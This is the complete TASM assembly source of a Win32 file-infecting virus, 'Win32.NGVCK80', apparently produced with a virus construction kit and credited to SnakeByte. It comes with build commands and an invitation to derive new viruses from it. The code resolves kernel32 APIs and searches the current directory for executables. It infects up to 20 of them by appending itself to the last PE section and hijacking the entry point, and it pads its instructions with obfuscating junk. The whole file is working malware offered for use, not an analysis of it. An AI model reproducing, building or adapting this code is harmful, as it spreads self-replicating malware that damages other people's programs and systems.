              
;
;
; Win32.NGVCK80 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK80
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/12/2015
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : Byte Comparison Type II
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 36
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m3 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop ebp
 sub ebp, offset Delta
 jmp KernelSearchStart


;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ecx Lenght of API-Name
                                        ; eax Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




 push dword ptr [ebp+NTableVA]
 pop ebx


SearchNextApi1:                         ; search for the API's
 push ebx
 mov edx, dword ptr [ebx]
 add edx, [ebp+KernelMZ]
                                        ; mov ebx, edx
 mov ebx, edx
                                        ; mov esi, ebx
 push ebx
 pop esi
 mov dword ptr [ebp+TempApisearch1], -1
 and dword ptr [ebp+TempApisearch1], ecx
 mov dword ptr [ebp+TempApisearch2], 0
 xor dword ptr [ebp+TempApisearch2], esi
 push eax
 pop dword ptr [ebp+TempApisearch3]
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; eax Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov dh, byte ptr [eax]
 cmp dh, byte ptr [esi]
 jne ApiNotFound
 sub ecx, 1
 sal edx, 7d                            ; Trash
 add ecx, -1
 add ecx, 1
 jz FoundApi1
                                        ; add eax, 1
 inc eax
                                        ; add esi, 1
 inc esi
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop ebx
                                        ; mov ecx, -1
 mov ecx, ( -1d + 13d )
 sub ecx, 13d
 and ecx, dword ptr [ebp+TempApisearch1]
 push dword ptr [ebp+TempApisearch3]
 pop eax
                                        ; clear esi
 sub esi, esi
 add esi, dword ptr [ebp+TempApisearch2]
                                        ; add ebx, 4
 dec ebx
 add ebx, 5d
 inc word ptr [ebp+counter]
 cmp word ptr [ebp+counter], 2001h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 4d
                                        ; retrieve the offset
 movzx ebx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 shl ebx, 1                             ; multiply with 2
 add ebx, dword ptr [ebp+OTableVA]
 mov edx, ebx
 movzx ebx, word ptr [edx]
 sal ebx, 2h
 add ebx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 push dword ptr [ebp+KernelMZ]
 pop edx
 add edx, dword ptr [ebx]
 mov dword ptr [ebp+TempAPI], 0
 add dword ptr [ebp+TempAPI], edx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edi
 popad
 jmp ExecuteHost



;                  [ ///// * Data * \\\\\ ]

Data:
 Attributes  dd 0h
 AlignReg2   dd 0h
 OTableVA    dd 0h
 TempApisearch3 dd 0h

 APIOffsets:
 XCreateFileA           dd 0h
 XMapViewOfFile         dd 0h
 XSetFileAttributesA    dd 0h
 XFindFirstFileA        dd 0h
 XFindClose             dd 0h
 XUnmapViewOfFile       dd 0h
 XFindNextFileA         dd 0h
 XCreateFileMappingA    dd 0h
 XGetFileAttributesA    dd 0h
 XCloseHandle           dd 0h

 NewSize     dd 0h
 OldEIP      dd 0h
 MapHandle   dd 0h
 OldBase     dd 400000h
 MapAddress  dd 0h
 NewEIP      dd 0h
 FindHandle  dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 KernelPE    dd 0h

 APINames:
 db 11d, 'CreateFileA'
 db 13d, 'MapViewOfFile'
 db 18d, 'SetFileAttributesA'
 db 14d, 'FindFirstFileA'
 db 09d, 'FindClose'
 db 15d, 'UnmapViewOfFile'
 db 13d, 'FindNextFileA'
 db 18d, 'CreateFileMappingA'
 db 18d, 'GetFileAttributesA'
 db 11d, 'CloseHandle'

 AlignReg1   dd 0h
 TempAPI     dd 0h
 counter     dw 0h
 InfCounter  dd 0h
 TempApisearch1 dd 0h
 filemask    db '*.EXe',0
 db 'Win32.NGVCK80 created by SnakeByte',0
 ATableVA    dd 0h
 Trash1      dd 0h
 FileHandle  dd 0h
 K32Trys     dd 0h
 AlignTemp   dd 0h
 KernelMZ    dd 0h
 NTableVA    dd 0h
 TempApisearch2 dd 0h




;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
 mov ecx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 sub edx, edx
 mov dword ptr [ebp+AlignTemp], eax
 div ecx
 sub ecx, edx
 mov eax, dword ptr [ebp+AlignTemp]
 add eax, ecx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret


;          [ ///// * FindFiles Procedure * \\\\\ ]


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea eax, [ebp+WIN32_FIND_DATA]
 xchg ecx, eax

 push ecx
                                        ; clear ebx
 sub ebx, ebx
 xor ebx, dword ptr [ebp+FindHandle]
 push ebx
 call dword ptr [ebp+XFindNextFileA]
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 mov edx, offset WIN32_FIND_DATA
 add edx, ebp

 push edx
 push ecx
 call dword ptr [ebp+XFindFirstFileA]
 push eax
 pop dword ptr [ebp+FindHandle]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov ebx, 276
 mov ebx, ( 276d + 14d )
 sub ebx, 14d
 lea ecx, [ebp+WFD_szFileName]
 xchg ecx, edx


ClearOldData2:
 mov byte ptr [edx], 0h
 and dword ptr [ebp+Trash1], 1843105    ; Trash
                                        ; add edx, 1
 add edx, 1d
 dec ebx
 jnz ClearOldData2
 popad
ret





;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
 mov eax, edx                           ; Trash
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop ebx
 push ebx
                                        ; round to pages
 shr ebx, 16d
 shl ebx, 16d
                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 3h

GK1:                                    ; check for DOS-EXE Stub
 push dword ptr [ebp+K32Trys]
 pop ecx
 cmp ecx, 0h
 jz NoKernel
                                        ; check for ZM
 movzx ecx, word ptr [ebx]
 sub ecx, 'ZM'
 jz CheckPE

GK2:
 inc ebx
 sub ebx, 65537d
 inc dword ptr [ebp+K32Trys]
 sub dword ptr [ebp+K32Trys], 2
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
                                        ; add ebx, 60
 add ebx, 60d
 mov ecx, [ebx]
 inc ebx
 sub ebx, 61d
 xchg ecx, ebx
 add ebx, ecx
 xchg ecx, ebx
                                        ; check for EP
 movzx edx, word ptr [ecx]
 xor edx, 'EP'
 jz CheckDLL
 jmp GK2

CheckDLL:
                                        ; check if the file is a DLL
                                        ; add ecx, 22
 add ecx, 22d
                                        ; clear edx
 push 0
 pop edx
 mov dx, word ptr [ecx]
 and dx, 0F000h
 cmp dx, 02000h
 je GotDLL
 jmp GK2
GotDLL:                                 ; we found a DLL file
 and eax, 22370126d                     ; Trash
 dec ecx
 sub ecx, 21d


KernelFound:
 mov dword ptr [ebp+KernelPE], -1
 and dword ptr [ebp+KernelPE], ecx
 push ebx
 pop dword ptr [ebp+KernelMZ]

 lea edx, [ebp+GetApis]
 xchg eax, edx

 push eax
ret

;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
 not edx                                ; Trash
                                        ; check for minimum filesize
 push dword ptr [ebp+WFD_nFileSizeLow]
 pop edx
 cmp edx, 20000d
 jbe NoInfection
                                        ; check for maximum filesize
 mov edx, ebp
 add edx, offset WFD_nFileSizeHigh

 cmp dword ptr [edx], 0
 jne NoInfection
                                        ; get and remove file attributes
 mov ebx, ebp
 add ebx, offset WFD_szFileName

 push ebx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
                                        ; mov edx, 128
 mov edx, 128d
 push edx
 lea ebx, [ebp+WFD_szFileName]
 xchg eax, ebx


 push eax
 call dword ptr [ebp+XSetFileAttributesA]
 test eax, eax
 jz NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; mov edi, -1
 mov edi, 0
 add edi, -1d
 and edi, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [edi], 'ZM'
 je Goodfile
 jmp Notagoodfile

Goodfile:
                                        ; clear eax
 xor eax, eax
 mov ax, word ptr [edi+3Ch]
 add eax, -1
 add eax, 1
 jz Notagoodfile
 mov ecx, dword ptr [edi+3Ch]
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],ecx
 jb Notagoodfile
 add ecx, edi
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [ecx], 'EP'
 je Goodfile2
                                        ; mov eax, 48822
 push 48822d
 pop eax
 cmp eax, 48822d
 je Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [ecx+4Ch], 'NGVC'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for DLL
 mov ax, word ptr [ecx+16h]
 and ax, 0F000h
 cmp ax, 02000h
 je Notagoodfile
                                        ; check for OBJ
 mov ax, word ptr [ecx+16h]
 and ax, 00002h
 cmp ax, 00002h
 jne Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
                                        ; restore the file attributes
                                        ; mov edx, -1
 mov edx, ( -1d xor 15d )
 xor edx, 15d
 and edx, dword ptr [ebp+Attributes]
 push edx
 lea edx, [ebp+WFD_szFileName]
 xchg edx, ebx

 push ebx
 call dword ptr [ebp+XSetFileAttributesA]
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need

                                        ; clear edi
 and edi, 0
 add edi, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear ecx
 and ecx, 0
 add ecx, [edi+78h]
 add ecx, [ebp+KernelMZ]
                                        ; add ecx, 28
 add ecx, 28d
                                        ; get ATableVA
 mov edi, dword ptr [ecx]
                                        ; add ecx, 4
 add ecx, 4d
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], edi
                                        ; get NTableVA
 mov edi, dword ptr [ecx]
                                        ; add ecx, 4
 add ecx, 4d
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], edi
                                        ; get OTableVA
 mov edi, dword ptr [ecx]
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], edi
                                        ; number of API's we're looking for
 push NumberOfApis
 pop edx

                                        ; load API Names and Offsets
 lea esi, [ebp+APINames]
 xchg esi, eax

 lea edi, [ebp+APIOffsets]


GetApisLoop: 
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h

                                        ; clear ecx
 mov ecx, 54440d
 sub ecx, 54440d
 mov cl, byte ptr [eax]
                                        ; add eax, 1
 add eax, 1d

                                        ; search 'em
                                        ; ecx contains Name-Lenght
                                        ; eax points to the Name
                                        ; edi points to the offset

 call SearchAPI1
 add eax, ecx
                                        ; clear ebx
 and ebx, 0
 xor ebx, dword ptr [ebp+TempAPI]
 mov dword ptr [edi], -1
 and dword ptr [edi], ebx
                                        ; add edi, 4
 add edi, 4d
 dec edx
 jnz GetApisLoop
 jmp Outbreak



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear ebx
 and ebx, 0

 push ebx
 push ebx
 push 3h
 push ebx
                                        ; add ebx, 1
 inc ebx
 push ebx
 mov ecx, 80000000h or 40000000h
 neg ebx                                ; Trash
 push ecx
 mov edi, ebp
 add edi, offset WFD_szFileName

 push edi
 call dword ptr [ebp+XCreateFileA]

 inc eax
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], 0
 add dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
                                        ; clear edx
 and edx, 0
 add edx, dword ptr [ebp+WFD_nFileSizeLow]
 push edx
 push 0
 push edx
 push 0
                                        ; mov ecx, 4
 mov ecx, ( 4d xor 6d )
 xor ecx, 6d
 push ecx
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], -1
 and dword ptr [ebp+MapHandle], eax
 pop edx
                                        ; add eax, 1
 add eax, 1d
 sub eax, 1
 jz CloseFile
 push edx
 push 0
 push 0
                                        ; mov ecx, 2
 mov ecx, 0
 add ecx, 2d
 push ecx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
                                        ; add eax, 1
 inc eax
 sub eax, 1
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], 0
 add dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 mov dword ptr [ebp+Trash1], 631123     ; Trash
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
                                        ; mov eax, -1
 mov eax, 0
 add eax, -1d
 and eax, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], 0
 xor dword ptr [ebp+retBase], eax

                                        ; clear eax
 mov eax, -57070d
 add eax, 57070d
 add eax, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 add dword ptr [ebp+retEIP], eax




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea esi, [ebp+filemask]
 xchg esi, ecx
 xor dword ptr [ebp+Trash1], 896384     ; Trash

                                        ; Set Infection Counter
                                        ; mov esi, 20
 push 20d
 pop esi
 push esi
 pop dword ptr [ebp+InfCounter]
                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir
 mov edx, ebx                           ; Trash

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 jna EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 or eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
                                        ; mov edi, -1
 mov edi, 0
 add edi, -1d
 and edi, dword ptr [ebp+FindHandle]
 push edi
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

 sub eax, 86649484d                     ; Trash
InfectEXE:                              ; infect an exe file
                                        ; clear esi
 mov esi, -24051d
 add esi, 24051d
 xor esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov eax, [esi+3Ch]
 add eax, esi
                                        ; get File Alignment
 mov edx, [eax+3Ch]
                                        ; clear eax
 mov eax, 0
 xor eax, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 push edx
 pop dword ptr [ebp+AlignReg2]
 add eax, VirusSize
 mov dword ptr [ebp+AlignReg1], 0
 xor dword ptr [ebp+AlignReg1], eax
 call Align
 push dword ptr [ebp+AlignReg1]
 pop eax
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], -1
 and dword ptr [ebp+NewSize], eax
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], 0
 add dword ptr [ebp+WFD_nFileSizeLow], eax
 call CreateMap
 jc NoEXE
                                        ; mov esi, -1
 mov esi, -1d
 and esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov edx, dword ptr [esi+3Ch]
 add edx, esi
                                        ; infect by increasing the last section
 mov esi, edx
                                        ; get last section
 movzx eax, word ptr [esi+06h]
 add eax, -1
 imul eax, eax, 28h
 add edx, eax
                                        ; add edx, 120
 dec edx
 add edx, 121d
 mov ecx, dword ptr [esi+74h]
 shl ecx, 3
 add edx, ecx
                                        ; get old Entrypoint
 mov eax, dword ptr [esi+28h]
 push eax
 pop dword ptr [ebp+OldEIP]
 mov ebx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], 0
 xor dword ptr [ebp+OldBase], ebx
 mov ecx, [edx+10h]
                                        ; mov ebx, ecx
                                        ; clear ebx
 mov ebx, 26611d
 sub ebx, 26611d
 add ebx, ecx
 add edx, 14h
 add ecx, [edx]
 sub edx, 14h
 push ecx
 mov eax, ebx
 add edx, 0Ch
 add eax, [edx]
 sub edx, 0Ch
 mov dword ptr [ebp+NewEIP], -1
 and dword ptr [ebp+NewEIP], eax
                                        ; save new enty point in file
 mov dword ptr [esi+28h], eax
                                        ; clear eax
 mov eax, -5067d
 add eax, 5067d

 add eax, [edx+10h]
 push eax
                                        ; calculate new section size
 push dword ptr  [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 add eax, VirusSize
 mov dword ptr [ebp+AlignReg1], 0
 xor dword ptr [ebp+AlignReg1], eax
 call Align
 xor dword ptr [ebp+Trash1], 1274232    ; Trash
                                        ; mov eax, -1
 mov eax, -1d
 and eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [edx+10h], 0h
 add dword ptr [edx+10h], eax
 pop eax
 add eax, VirusSize
 mov dword ptr [edx+08h], 0
 add dword ptr [edx+08h], eax
 mov eax, dword ptr [edx+10h]
 add eax, dword ptr [edx+0Ch]
 mov dword ptr [esi+50h], eax
                                        ; set write, read and code flag
 or dword ptr [edx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 add edi, dword ptr [ebp+MapAddress]
 mov ecx, VirusSize
 lea edx, [ebp+Virus]
 rol eax, 22d                           ; Trash
 xchg edx, esi


AppendLoop:
 rep movsb
 rol edx, 9d                            ; Trash
                                        ; decrease Infection Counter
                                        ; clear ebx
 and ebx, 0
 xor ebx, dword ptr [ebp+InfCounter]
 add ebx, -1
 mov dword ptr [ebp+InfCounter], 0
 xor dword ptr [ebp+InfCounter], ebx
 clc
ret

NoEXE:
 stc
ret



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
                                        ; mov edi, -1
 mov edi, 0
 add edi, -1d
 and edi, dword ptr [ebp+OldBase]

 push edi
 pop dword ptr [ebp+retBase]

                                        ; mov esi, -1
 mov esi, 0
 add esi, -1d
 and esi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 xor dword ptr [ebp+retEIP], esi



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
                                        ; add ebp, 1
 sub ebp, -1d
 dec ebp
 jz FirstGenHost
 mov ecx,12345678h
 org $-4
 retBase dd 0h
 add ecx,12345678h
 org $-4
 retEIP dd 0h
 jmp ecx



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

